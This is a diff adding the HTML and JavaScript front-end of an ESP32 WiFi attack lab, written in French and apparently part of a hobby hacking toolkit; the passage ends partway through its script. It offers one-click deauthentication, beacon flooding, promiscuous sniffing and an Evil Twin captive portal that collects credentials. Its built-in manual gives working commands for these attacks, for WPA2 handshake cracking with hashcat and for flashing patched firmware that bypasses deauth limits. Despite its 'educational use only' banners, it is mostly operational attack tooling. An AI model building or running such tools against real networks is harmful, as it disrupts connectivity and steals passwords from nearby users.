@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ESP32 WiFi Hacking Lab</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">
+<style>
+  /* ── Base ── */
+  body { background: #0d1117; color: #e6edf3; font-family: 'Segoe UI', sans-serif; }
+
+  /* ── Navbar ── */
+  .navbar { background: #161b22 !important; border-bottom: 1px solid #30363d; }
+  .navbar-brand { color: #58a6ff !important; font-weight: 700; letter-spacing: 1px; }
+  .nav-link { color: #cdd9e5 !important; font-weight: 500; padding-bottom: 8px; }
+  .nav-link:hover { color: #ffffff !important; }
+  .nav-link.active { color: #58a6ff !important; border-bottom: 2px solid #58a6ff; }
+
+  /* ── Cards ── */
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 10px; }
+  .card-header { background: #21262d; border-bottom: 1px solid #30363d;
+                 font-weight: 600; color: #e6edf3; }
+
+  /* ── Terminal ── */
+  .terminal {
+    background: #010409; color: #7ee787; font-family: 'Courier New', monospace;
+    font-size: 13px; height: 280px; overflow-y: auto; padding: 12px;
+    border: 1px solid #30363d; border-radius: 6px;
+  }
+  .terminal .err  { color: #ff7b72; }
+  .terminal .ok   { color: #7ee787; }
+  .terminal .info { color: #79c0ff; }
+
+  /* ── Buttons ── */
+  .btn-attack          { background: #da3633; border: none; color: #fff; font-weight: 600; }
+  .btn-attack:hover    { background: #b91c1a; color: #fff; }
+  .btn-attack:disabled { background: #6e1c1a; color: #aaa; }
+  .btn-scan            { background: #1f6feb; border: none; color: #fff; font-weight: 600; }
+  .btn-scan:hover      { background: #1158c7; color: #fff; }
+  .btn-sniff           { background: #238636; border: none; color: #fff; font-weight: 600; }
+  .btn-sniff:hover     { background: #196127; color: #fff; }
+
+  /* ── Forms ── */
+  .form-label { color: #cdd9e5 !important; font-weight: 500; margin-bottom: 4px; }
+  .form-control, .form-select {
+    background: #0d1117 !important; color: #e6edf3 !important;
+    border: 1px solid #444c56 !important; border-radius: 6px;
+  }
+  .form-control:focus, .form-select:focus {
+    background: #0d1117 !important; color: #e6edf3 !important;
+    border-color: #58a6ff !important; box-shadow: 0 0 0 2px rgba(88,166,255,.2) !important;
+  }
+  .form-control::placeholder { color: #6e7681 !important; }
+  .form-control:disabled, .form-select:disabled {
+    background: #21262d !important; color: #8b949e !important;
+  }
+  /* Options dans les selects */
+  .form-select option { background: #161b22; color: #e6edf3; }
+
+  /* ── Status dot ── */
+  .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+  .status-dot.on  { background: #3fb950; box-shadow: 0 0 6px #3fb950; }
+  .status-dot.off { background: #f85149; }
+
+  /* ── Table ── */
+  .table-dark { --bs-table-bg: #161b22; --bs-table-border-color: #30363d;
+                --bs-table-color: #e6edf3; }
+  .table-dark th { color: #79c0ff; font-size: 0.8rem; text-transform: uppercase;
+                   letter-spacing: 1px; }
+  .table-dark td { color: #e6edf3; }
+  tr.selectable:hover   { background: #1f2937 !important; cursor: pointer; }
+  tr.selectable.selected { background: #1c3a5e !important; }
+
+  /* ── Misc ── */
+  .section-title { color: #58a6ff; font-size: 0.75rem; text-transform: uppercase;
+                   letter-spacing: 2px; margin-bottom: 1rem; font-weight: 700; }
+  .progress-thin { height: 4px; border-radius: 2px; }
+  .text-muted { color: #8b949e !important; }
+  small.text-muted { color: #8b949e !important; }
+
+  /* ── Docs ── */
+  .doc-content { color: #e6edf3; line-height: 1.7; }
+  .doc-content h2 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 6px; }
+  .doc-content h3 { color: #79c0ff; }
+  .doc-content code { background: #21262d; padding: 2px 6px; border-radius: 4px; color: #f2cc60; }
+  .doc-content pre  { background: #010409; border: 1px solid #30363d; border-radius: 6px;
+                      padding: 12px; overflow-x: auto; }
+  .doc-content pre code { background: none; padding: 0; color: #7ee787; }
+
+  /* ── Alert ── */
+  .alert-dark-custom { background: #272115; border: 1px solid #f2cc60;
+                       color: #f2cc60; border-radius: 8px; }
+
+  /* ── Sidebar docs ── */
+  .list-group-item { color: #cdd9e5 !important; }
+  .list-group-item:hover { color: #58a6ff !important; background: #21262d !important; }
+
+  /* ── Badge ── */
+  .badge-custom { font-size: 0.7rem; padding: 3px 8px; border-radius: 20px; }
+</style>
+</head>
+<body>
+
+<!-- Navbar -->
+<nav class="navbar navbar-expand-lg sticky-top">
+  <div class="container-fluid px-4">
+    <span class="navbar-brand">
+      <i class="bi bi-broadcast-pin me-2"></i>ESP32 WiFi Lab
+    </span>
+    <div class="d-flex align-items-center ms-auto gap-3">
+      <span class="status-dot off" id="statusDot"></span>
+      <small id="statusText" style="color:#cdd9e5">Connexion...</small>
+      <small style="color:#79c0ff">{{ serial_port }}</small>
+    </div>
+  </div>
+</nav>
+
+<!-- Tabs -->
+<div class="container-fluid px-4 mt-3">
+  <ul class="nav nav-tabs border-0 mb-4" id="mainTabs">
+    <li class="nav-item"><a class="nav-link active" href="#" data-tab="scanner"><i class="bi bi-wifi me-1"></i>Scanner</a></li>
+    <li class="nav-item"><a class="nav-link" href="#" data-tab="deauth"><i class="bi bi-slash-circle me-1"></i>Deauth</a></li>
+    <li class="nav-item"><a class="nav-link" href="#" data-tab="beacon"><i class="bi bi-broadcast me-1"></i>Beacon Spam</a></li>
+    <li class="nav-item"><a class="nav-link" href="#" data-tab="sniffer"><i class="bi bi-eye me-1"></i>Sniffer</a></li>
+    <li class="nav-item"><a class="nav-link" href="#" data-tab="eviltwin"><i class="bi bi-person-badge me-1"></i>Evil Twin</a></li>
+    <li class="nav-item"><a class="nav-link" href="#" data-tab="docs"><i class="bi bi-book me-1"></i>Manuel</a></li>
+  </ul>
+
+  <!-- ===== SCANNER ===== -->
+  <div class="tab-content" id="tab-scanner">
+    <div class="row g-3">
+      <div class="col-12">
+        <div class="card">
+          <div class="card-header d-flex justify-content-between align-items-center">
+            <span><i class="bi bi-wifi me-2"></i>Réseaux WiFi détectés</span>
+            <button class="btn btn-scan btn-sm" onclick="runScan()">
+              <i class="bi bi-arrow-clockwise me-1"></i>Scanner
+            </button>
+          </div>
+          <div class="card-body p-0">
+            <div class="progress progress-thin" id="scanProgress" style="display:none">
+              <div class="progress-bar progress-bar-striped progress-bar-animated bg-primary w-100"></div>
+            </div>
+            <div class="terminal" id="scanTerminal" style="height:180px; display:none"></div>
+            <table class="table table-dark table-hover mb-0" id="networkTable">
+              <thead><tr>
+                <th></th><th>SSID</th><th>BSSID</th><th>Canal</th><th>RSSI</th><th>Sécurité</th>
+              </tr></thead>
+              <tbody id="networkBody">
+                <tr><td colspan="6" class="text-center text-muted py-4">
+                  <i class="bi bi-wifi-off me-2"></i>Cliquez sur Scanner pour détecter les réseaux
+                </td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      <!-- Statut ESP32 -->
+      <div class="col-md-4">
+        <div class="card h-100">
+          <div class="card-header"><i class="bi bi-cpu me-2"></i>Statut ESP32</div>
+          <div class="card-body">
+            <div class="d-flex justify-content-between mb-2">
+              <span class="text-muted">Connexion</span>
+              <span id="s-connected">—</span>
+            </div>
+            <div class="d-flex justify-content-between mb-2">
+              <span class="text-muted">Firmware</span>
+              <small id="s-firmware" class="text-info">—</small>
+            </div>
+            <div class="d-flex justify-content-between mb-2">
+              <span class="text-muted">RAM libre</span>
+              <span id="s-ram">—</span>
+            </div>
+            <div class="d-flex justify-content-between">
+              <span class="text-muted">Injection 802.11</span>
+              <span id="s-custom">—</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== DEAUTH ===== -->
+  <div class="tab-content" id="tab-deauth" style="display:none">
+    <div class="alert-dark-custom p-3 mb-3">
+      <i class="bi bi-exclamation-triangle-fill me-2"></i>
+      <strong>Usage éducatif uniquement</strong> — Réservé à vos propres réseaux ou avec autorisation écrite.
+    </div>
+    <div class="row g-3">
+      <div class="col-md-5">
+        <div class="card">
+          <div class="card-header"><i class="bi bi-bullseye me-2"></i>Cible</div>
+          <div class="card-body">
+            <div class="mb-3">
+              <label class="form-label">BSSID de l'AP (MAC)</label>
+              <input type="text" class="form-control"
+                     id="deauth-bssid" placeholder="xx:xx:xx:xx:xx:xx">
+              <small class="" style="color:#8b949e">Sélectionnez un réseau dans le Scanner pour auto-remplir</small>
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Canal</label>
+              <input type="number" class="form-control"
+                     id="deauth-ch" value="6" min="1" max="13">
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Nombre de trames</label>
+              <input type="number" class="form-control"
+                     id="deauth-count" value="100" min="10" max="1000">
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Mode</label>
+              <select class="form-select" id="deauth-mode"
+                      onchange="toggleClientMac()">
+                <option value="broadcast">Broadcast (tous les clients)</option>
+                <option value="client">Client spécifique</option>
+              </select>
+            </div>
+            <div id="client-mac-div" style="display:none" class="mb-3">
+              <label class="form-label">MAC du client cible</label>
+              <input type="text" class="form-control"
+                     id="deauth-client" placeholder="xx:xx:xx:xx:xx:xx">
+            </div>
+            <button class="btn btn-attack w-100" onclick="runDeauth()">
+              <i class="bi bi-lightning-fill me-2"></i>Lancer l'attaque Deauth
+            </button>
+          </div>
+        </div>
+      </div>
+      <div class="col-md-7">
+        <div class="card h-100">
+          <div class="card-header"><i class="bi bi-terminal me-2"></i>Sortie</div>
+          <div class="card-body p-2">
+            <div class="terminal" id="deauth-terminal">
+              <span class="info">[~] En attente...</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== BEACON SPAM ===== -->
+  <div class="tab-content" id="tab-beacon" style="display:none">
+    <div class="row g-3">
+      <div class="col-md-5">
+        <div class="card">
+          <div class="card-header"><i class="bi bi-broadcast me-2"></i>Beacon Flood</div>
+          <div class="card-body">
+            <div class="mb-3">
+              <label class="form-label">Mode</label>
+              <select class="form-select" id="beacon-mode"
+                      onchange="toggleBeaconSsid()">
+                <option value="random">SSIDs aléatoires</option>
+                <option value="fr">Opérateurs français (Orange/SFR/Free…)</option>
+                <option value="clone">Cloner un SSID précis</option>
+              </select>
+            </div>
+            <div id="beacon-ssid-div" style="display:none" class="mb-3">
+              <label class="form-label">SSID à cloner</label>
+              <input type="text" class="form-control"
+                     id="beacon-ssid" placeholder="NomDuReseau">
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Canal</label>
+              <input type="number" class="form-control"
+                     id="beacon-ch" value="6" min="1" max="13">
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Nombre de beacons</label>
+              <input type="number" class="form-control"
+                     id="beacon-count" value="50" min="10" max="500">
+            </div>
+            <button class="btn btn-attack w-100" onclick="runBeacon()">
+              <i class="bi bi-broadcast me-2"></i>Lancer Beacon Spam
+            </button>
+          </div>
+        </div>
+      </div>
+      <div class="col-md-7">
+        <div class="card h-100">
+          <div class="card-header"><i class="bi bi-terminal me-2"></i>Sortie</div>
+          <div class="card-body p-2">
+            <div class="terminal" id="beacon-terminal">
+              <span class="info">[~] En attente...</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== SNIFFER ===== -->
+  <div class="tab-content" id="tab-sniffer" style="display:none">
+    <div class="row g-3">
+      <!-- Packet Sniffer -->
+      <div class="col-md-6">
+        <div class="card">
+          <div class="card-header"><i class="bi bi-eye me-2"></i>Packet Sniffer (promiscuous)</div>
+          <div class="card-body">
+            <div class="mb-3">
+              <label class="form-label">Durée (secondes)</label>
+              <input type="number" class="form-control"
+                     id="sniff-dur" value="10" min="5" max="60">
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Canal (vide = hopping auto)</label>
+              <input type="number" class="form-control"
+                     id="sniff-ch" placeholder="1-13" min="1" max="13">
+            </div>
+            <button class="btn btn-sniff w-100 mb-3" onclick="runSniff()">
+              <i class="bi bi-eye me-2"></i>Démarrer capture
+            </button>
+            <div class="terminal" id="sniff-terminal" style="height:200px">
+              <span class="info">[~] En attente...</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- Probe Sniffer -->
+      <div class="col-md-6">
+        <div class="card">
+          <div class="card-header"><i class="bi bi-search me-2"></i>Probe Request Sniffer</div>
+          <div class="card-body">
+            <div class="mb-3">
+              <label class="form-label">Durée (secondes)</label>
+              <input type="number" class="form-control"
+                     id="probe-dur" value="15" min="5" max="60">
+            </div>
+            <p class="text-muted small">
+              Capture les requêtes Probe émises par les appareils à proximité.
+              Affiche les SSIDs recherchés et les adresses MAC.
+            </p>
+            <button class="btn btn-sniff w-100 mb-3" onclick="runProbe()">
+              <i class="bi bi-search me-2"></i>Démarrer probe sniffer
+            </button>
+            <div class="terminal" id="probe-terminal" style="height:200px">
+              <span class="info">[~] En attente...</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== EVIL TWIN ===== -->
+  <div class="tab-content" id="tab-eviltwin" style="display:none">
+    <div class="alert-dark-custom p-3 mb-3">
+      <i class="bi bi-exclamation-triangle-fill me-2"></i>
+      <strong>Usage éducatif uniquement</strong> — L'Evil Twin crée un AP factice avec portail captif.
+    </div>
+    <div class="row g-3">
+      <div class="col-md-5">
+        <div class="card">
+          <div class="card-header"><i class="bi bi-person-badge me-2"></i>Configuration Evil Twin</div>
+          <div class="card-body">
+            <div class="mb-3">
+              <label class="form-label">SSID à imiter</label>
+              <input type="text" class="form-control"
+                     id="et-ssid" placeholder="NomDuReseau">
+              <small class="" style="color:#8b949e">Sélectionnez un réseau dans le Scanner pour auto-remplir</small>
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Canal</label>
+              <input type="number" class="form-control"
+                     id="et-ch" value="6" min="1" max="13">
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Deauth de l'AP réel (optionnel)</label>
+              <input type="text" class="form-control"
+                     id="et-bssid" placeholder="BSSID de l'AP réel (optionnel)">
+            </div>
+            <div class="d-flex gap-2 mb-2">
+              <button class="btn btn-attack flex-grow-1" id="et-start-btn" onclick="startEvilTwin()">
+                <i class="bi bi-person-badge me-2"></i>Démarrer
+              </button>
+              <button class="btn btn-outline-danger flex-grow-1" id="et-stop-btn" onclick="stopEvilTwin()" disabled>
+                <i class="bi bi-stop-circle me-2"></i>Stopper
+              </button>
+            </div>
+            <div class="mb-2">
+              <span id="et-status-badge" class="badge bg-secondary">Inactif</span>
+            </div>
+            <button class="btn btn-sniff w-100" onclick="getCaptures()">
+              <i class="bi bi-collection me-2"></i>Voir identifiants capturés
+            </button>
+          </div>
+        </div>
+      </div>
+      <div class="col-md-7">
+        <div class="card h-100">
+          <div class="card-header"><i class="bi bi-terminal me-2"></i>Sortie &amp; Identifiants</div>
+          <div class="card-body p-2">
+            <div class="terminal" id="et-terminal">
+              <span class="info">[~] En attente...</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== DOCS ===== -->
+  <div class="tab-content" id="tab-docs" style="display:none">
+    <div class="row">
+      <div class="col-lg-3 mb-3">
+        <div class="card">
+          <div class="card-header"><i class="bi bi-list me-2"></i>Sommaire</div>
+          <div class="list-group list-group-flush bg-transparent" id="docNav">
+            <a href="#doc-start"    class="list-group-item list-group-item-action bg-transparent border-0">Démarrage rapide</a>
+            <a href="#doc-scanner"  class="list-group-item list-group-item-action bg-transparent border-0">Scanner WiFi</a>
+            <a href="#doc-sniffer"  class="list-group-item list-group-item-action bg-transparent border-0">Sniffer</a>
+            <a href="#doc-deauth"   class="list-group-item list-group-item-action bg-transparent border-0">Deauth Attack</a>
+            <a href="#doc-beacon"   class="list-group-item list-group-item-action bg-transparent border-0">Beacon Spam</a>
+            <a href="#doc-eviltwin" class="list-group-item list-group-item-action bg-transparent border-0">Evil Twin</a>
+            <a href="#doc-stream"   class="list-group-item list-group-item-action bg-transparent border-0">Streaming → Kali</a>
+            <a href="#doc-firmware" class="list-group-item list-group-item-action bg-transparent border-0">Firmware custom</a>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-9 doc-content">
+
+        <h2 id="doc-start"><i class="bi bi-rocket me-2"></i>Démarrage rapide</h2>
+        <ol>
+          <li>Brancher l'ESP32 sur USB → <code>/dev/ttyUSB0</code></li>
+          <li>Activer l'environnement : <code>source "Wifi Hacking/.venv/bin/activate"</code></li>
+          <li>Lancer cette interface : <code>python tools/webui.py</code></li>
+          <li>Ouvrir <strong>http://localhost:8080</strong> dans le navigateur</li>
+        </ol>
+        <p>Pour accéder depuis un autre appareil du réseau : <code>http://&lt;IP-Kali&gt;:8080</code></p>
+
+        <hr class="border-secondary">
+
+        <h2 id="doc-scanner"><i class="bi bi-wifi me-2"></i>Scanner WiFi</h2>
+        <p>Le scanner utilise l'interface STA de l'ESP32 pour détecter les réseaux à proximité.</p>
+        <h3>Via cette interface</h3>
+        <p>Onglet <strong>Scanner</strong> → bouton <strong>Scanner</strong>. Cliquer sur un réseau dans le tableau pour le sélectionner et pré-remplir les autres formulaires.</p>
+        <h3>Via le REPL MicroPython</h3>
+        <pre><code>from lib.wifi_scanner import scan, scan_loop, select
+
+nets = scan()                  # scan unique
+scan_loop(interval=10)         # scans toutes les 10s
+cible = select(nets)           # sélection interactive</code></pre>
+
+        <hr class="border-secondary">
+
+        <h2 id="doc-sniffer"><i class="bi bi-eye me-2"></i>Sniffer (mode promiscuous)</h2>
+        <p><strong>Nécessite le firmware custom.</strong> Capture toutes les trames 802.11 à proximité.</p>
+        <h3>Packet Sniffer</h3>
+        <pre><code>from lib.packet_sniffer import sniff
+
+sniff(duration=30)             # 30s, hopping auto sur canaux 1-13
+sniff(duration=60, channel=6)  # 60s, canal 6 fixé</code></pre>
+        <h3>Probe Request Sniffer</h3>
+        <p>Capture les requêtes émises par les appareils qui cherchent des réseaux connus.</p>
+        <pre><code>from lib.probe_sniffer import sniff_probes
+
+sniff_probes(duration=60)           # 60s, hopping
+sniff_probes(duration=0, channel=1) # infini sur canal 1</code></pre>
+
+        <hr class="border-secondary">
+
+        <h2 id="doc-deauth"><i class="bi bi-slash-circle me-2"></i>Deauth Attack</h2>
+        <p><strong>Nécessite le firmware custom.</strong> Envoie des trames de désauthentification 802.11 (subtype 0xC0) pour déconnecter des clients.</p>
+        <pre><code>from lib.wifi_scanner import scan, select
+from lib.deauth import deauth_client, deauth_broadcast, deauth_loop
+
+nets  = scan()
+cible = select(nets)
+
+# Déconnecter un client spécifique
+deauth_client(cible['bssid'], 'aa:bb:cc:dd:ee:ff', count=100)
+
+# Déconnecter tous les clients (broadcast)
+deauth_broadcast(cible['bssid'], count=200)
+
+# Continu jusqu'à Ctrl+C
+deauth_loop(cible['bssid'])</code></pre>
+        <div class="alert alert-warning bg-transparent border-warning text-warning small">
+          <i class="bi bi-exclamation-triangle me-2"></i>
+          Utilisation légale uniquement sur vos propres réseaux ou avec autorisation écrite.
+        </div>
+
+        <hr class="border-secondary">
+
+        <h2 id="doc-beacon"><i class="bi bi-broadcast me-2"></i>Beacon Spam</h2>
+        <p><strong>Nécessite le firmware custom.</strong> Génère de faux points d'accès (flooding de Beacons).</p>
+        <pre><code>from lib.beacon_spam import spam_random, spam_fr, spam_clone
+
+spam_random(channel=6)                   # SSIDs aléatoires
+spam_fr(channel=1)                       # Opérateurs FR (Orange/SFR/Free...)
+spam_clone('NomDuReseau', channel=6)     # Cloner un SSID précis</code></pre>
+
+        <hr class="border-secondary">
+
+        <h2 id="doc-eviltwin"><i class="bi bi-person-badge me-2"></i>Evil Twin + Portail Captif</h2>
+        <p>Crée un AP factice avec portail captif pour capturer des identifiants.</p>
+        <pre><code>from lib.wifi_scanner import scan, select
+from lib.evil_twin import start, show_captured
+
+nets  = scan()
+cible = select(nets)
+
+# Evil Twin simple
+start(cible['ssid'], channel=cible['ch'])
+
+# Avec deauth de l'AP réel en simultané
+start(cible['ssid'], channel=cible['ch'], deauth_ap_mac=cible['bssid'])
+
+# Voir les credentials capturés
+show_captured()</code></pre>
+
+        <hr class="border-secondary">
+
+        <h2 id="doc-stream"><i class="bi bi-cloud-arrow-up me-2"></i>Streaming → Kali Linux</h2>
+        <h3>1. Démarrer le receiver sur Kali</h3>
+        <pre><code>python3 tools/receiver.py
+# Options : --port 9999 --out captures/</code></pre>
+        <h3>2. Connecter l'ESP32 et streamer</h3>
+        <pre><code>from lib.streaming import connect_ap, start
+
+connect_ap('NomDuHotspot', 'motdepasse')
+start()                           # hopping auto
+start(duration=120, channel=6)    # canal fixé</code></pre>
+        <h3>3. Analyser avec Wireshark / Hashcat</h3>
+        <pre><code>wireshark captures/capture_*.pcap
+
+# Crack WPA2 si handshake capturé
+hcxpcapngtool -o hash.hc22000 captures/capture_*.pcap
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt</code></pre>
+
+        <hr class="border-secondary">
+
+        <h2 id="doc-firmware"><i class="bi bi-gear me-2"></i>Firmware Custom</h2>
+        <p>Le firmware officiel MicroPython ne supporte pas l'injection ni le mode promiscuous. Le firmware custom ajoute :</p>
+        <ul>
+          <li><code>esp.wifi_set_promiscuous(True/False)</code></li>
+          <li><code>esp.wifi_get_pkt()</code></li>
+          <li><code>esp.wifi_send_pkt_freedom(buf, seq)</code></li>
+        </ul>
+        <pre><code># Compiler et flasher (nécessite Docker)
+bash tools/build_firmware.sh</code></pre>
+        <h3>Flash manuel</h3>
+        <pre><code># 1. Effacer la flash
+python3 -m esptool --port /dev/ttyUSB0 --baud 460800 erase-flash
+
+# 2. Flasher le firmware mergé (bootloader + app)
+python3 -m esptool --port /dev/ttyUSB0 --baud 460800 \
+    write-flash -z 0x1000 firmware/micropython-esp32-custom-wifi.bin
+
+# 3. Flasher l'app patchée (bypass deauth)
+python3 -m esptool --port /dev/ttyUSB0 --baud 460800 \
+    write-flash -z 0x10000 firmware/micropython-app-patched.bin
+
+# 4. Déployer les modules Python
+python tools/deploy.py</code></pre>
+
+        <h3>Modules disponibles</h3>
+        <table class="table table-dark table-bordered mt-3">
+          <thead><tr><th>Module</th><th>Fonctions</th><th>Firmware custom</th></tr></thead>
+          <tbody>
+            <tr><td><code>wifi_scanner</code></td><td>scan(), scan_loop(), select()</td><td class="text-success">Non</td></tr>
+            <tr><td><code>packet_sniffer</code></td><td>sniff(duration, channel)</td><td class="text-warning">Oui</td></tr>
+            <tr><td><code>probe_sniffer</code></td><td>sniff_probes(duration, channel)</td><td class="text-warning">Oui</td></tr>
+            <tr><td><code>packet_builder</code></td><td>build_deauth(), build_beacon(), send()</td><td class="text-warning">Oui</td></tr>
+            <tr><td><code>deauth</code></td><td>deauth_client(), deauth_broadcast(), deauth_loop()</td><td class="text-warning">Oui</td></tr>
+            <tr><td><code>beacon_spam</code></td><td>spam_random(), spam_fr(), spam_clone()</td><td class="text-warning">Oui</td></tr>
+            <tr><td><code>evil_twin</code></td><td>start(), show_captured()</td><td class="text-success">Non (deauth opt.)</td></tr>
+            <tr><td><code>streaming</code></td><td>connect_ap(), start()</td><td class="text-warning">Oui</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+// ── Gestion des onglets ────────────────────────────────────────────────────
+let currentTab = 'scanner';
+document.querySelectorAll('[data-tab]').forEach(a => {
+  a.addEventListener('click', e => {
+    e.preventDefault();
+    document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
+    document.querySelectorAll('[data-tab]').forEach(x => x.classList.remove('active'));
+    document.getElementById('tab-' + a.dataset.tab).style.display = '';
+    a.classList.add('active');
+    currentTab = a.dataset.tab;
+  });
+});
+
+// ── Statut ESP32 ───────────────────────────────────────────────────────────
+function refreshStatus() {
+  fetch('/api/status').then(r => r.json()).then(d => {
+    const dot = document.getElementById('statusDot');
+    const txt = document.getElementById('statusText');
+    if (d.connected) {
+      dot.className = 'status-dot on';
+      txt.textContent = 'Connecté';
+    } else {
+      dot.className = 'status-dot off';
+      txt.textContent = 'Non connecté';
+    }
+    document.getElementById('s-connected').innerHTML = d.connected
+      ? '<span class="badge bg-success">OK</span>'
+      : '<span class="badge bg-danger">Hors ligne</span>';
+    document.getElementById('s-firmware').textContent = d.firmware || '—';
+    document.getElementById('s-ram').textContent = d.ram ? (d.ram/1024).toFixed(0)+' KB' : '—';
+    document.getElementById('s-custom').innerHTML = d.custom
+      ? '<span class="badge bg-success">Activée</span>'
+      : '<span class="badge bg-warning text-dark">Non disponible</span>';
+  }).catch(() => {
+    document.getElementById('statusDot').className = 'status-dot off';
+    document.getElementById('statusText').textContent = 'Erreur';
+  });
+}
+refreshStatus();
+setInterval(refreshStatus, 10000);
+
+// ── Helpers terminal ───────────────────────────────────────────────────────
+function stripAnsi(s) {
+  return s.replace(/\x1b\[[0-9;]*[mK]/g, '').replace(/\r/g, '');
+}
+function termLog(id, msg, cls) {
+  const t = document.getElementById(id);
+  const clean = stripAnsi(String(msg));
+  clean.split('\n').forEach(line => {
+    if (!line.trim()) return;
+    const div = document.createElement('div');
+    div.className = cls || (line.includes('[+]') ? 'ok' : line.includes('[x]') ? 'err' : '');
+    div.textContent = line;
+    t.appendChild(div);
+  });
+  t.scrollTop = t.scrollHeight;
+}
+function termClear(id) {
+  document.getElementById(id).innerHTML = '';
+}
+
+// ── Scanner ────────────────────────────────────────────────────────────────
+let networks = [];
+
+function runScan() {
+  const prog = document.getElementById('scanProgress');
+  const term = document.getElementById('scanTerminal');
+  prog.style.display = '';
+  term.style.display = '';
+  termClear('scanTerminal');
+  document.getElementById('networkBody').innerHTML = '<tr><td colspan="6" class="text-center text-muted py-3"><div class="spinner-border spinner-border-sm me-2"></div>Scan en cours...</td></tr>';
+
+  const es = new EventSource('/api/stream/scan');
+  es.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    if (msg === '__END__') { es.close(); prog.style.display = 'none'; return; }
+    termLog('scanTerminal', msg, msg.includes('[+]') ? 'ok' : msg.includes('[x]') ? 'err' : 'info');
+  };
+  es.onerror = () => { es.close(); prog.style.display = 'none'; };
+
+  fetch('/api/scan', {method: 'POST'}).then(r => r.json()).then(d => {
+    networks = d.networks || [];
+    renderNetworks(networks);
+    term.style.display = 'none';
+  }).catch(err => {
+    termLog('scanTerminal', 'Erreur: ' + err, 'err');
+    prog.style.display = 'none';
+  });
+}
+
+function renderNetworks(nets) {
+  const body = document.getElementById('networkBody');
+  if (!nets.length) {
+    body.innerHTML = '<tr><td colspan="6" class="text-center text-muted py-4">Aucun réseau détecté</td></tr>';
+    return;
+  }
+  const authNames = ['Open','WEP','WPA PSK','WPA2 PSK','WPA/WPA2 PSK','','Enterprise'];
+  body.innerHTML = nets.map((n, i) => `
+    <tr class="selectable" onclick="selectNetwork(${i})">
+      <td>${rssiBar(n.rssi)}</td>
+      <td><strong>${esc(n.ssid)}</strong></td>
+      <td><code style="font-size:0.8rem">${n.bssid}</code></td>
+      <td>${n.ch}</td>
+      <td><span class="text-${n.rssi > -60 ? 'success' : n.rssi > -75 ? 'warning' : 'danger'}">${n.rssi} dBm</span></td>
+      <td><span class="badge bg-secondary">${authNames[n.auth] || 'Unknown'}</span></td>
+    </tr>`).join('');
+}
+
+function rssiBar(rssi) {
+  const pct = Math.max(0, Math.min(100, (rssi + 100) * 2));
+  const col = pct > 60 ? 'success' : pct > 30 ? 'warning' : 'danger';
+  return `<div class="progress bg-dark" style="width:60px;height:8px">
+    <div class="progress-bar bg-${col}" style="width:${pct}%"></div></div>`;
+}
+
+function selectNetwork(idx) {
+  document.querySelectorAll('tr.selectable').forEach(r => r.classList.remove('selected'));
+  document.querySelectorAll('tr.selectable')[idx].classList.add('selected');
+  const n = networks[idx];
+  document.getElementById('deauth-bssid').value = n.bssid;
+  document.getElementById('deauth-ch').value = n.ch;
+  document.getElementById('et-ssid').value = n.ssid;
+  document.getElementById('et-ch').value = n.ch;
+  document.getElementById('et-bssid').value = n.bssid;
+}
+
+// ── Deauth ─────────────────────────────────────────────────────────────────
+function toggleClientMac() {
+  document.getElementById('client-mac-div').style.display =
+    document.getElementById('deauth-mode').value === 'client' ? '' : 'none';
+}
+
+function runDeauth() {
+  const bssid = document.getElementById('deauth-bssid').value.trim();
+  const mode  = document.getElementById('deauth-mode').value;
+  const count = +document.getElementById('deauth-count').value;
+  const ch    = +document.getElementById('deauth-ch').value;
+  if (!bssid) { alert('BSSID requis'); return; }
+
+  termClear('deauth-terminal');
+  termLog('deauth-terminal', `[>] Deauth ${mode} → ${bssid} (${count} trames, ch${ch})`, 'info');
+
+  const url  = mode === 'broadcast' ? '/api/deauth/broadcast' : '/api/deauth/client';
+  const body = { bssid, count, channel: ch };
+  if (mode === 'client') body.client_mac = document.getElementById('deauth-client').value.trim();
+
+  fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)})
+    .then(r => r.json()).then(d => {
+      if (d.ok) termLog('deauth-terminal', d.sent || d.out || '[+] OK');
+      else      termLog('deauth-terminal', `[x] Erreur : ${d.error}`, 'err');
+    }).catch(e => termLog('deauth-terminal', '[x] ' + e, 'err'));
+}
+
+// ── Beacon Spam ────────────────────────────────────────────────────────────
+function toggleBeaconSsid() {
+  document.getElementById('beacon-ssid-div').style.display =
+    document.getElementById('beacon-mode').value === 'clone' ? '' : 'none';
+}
+
+function runBeacon() {
+  const mode  = document.getElementById('beacon-mode').value;
+  const ssid  = document.getElementById('beacon-ssid').value.trim();
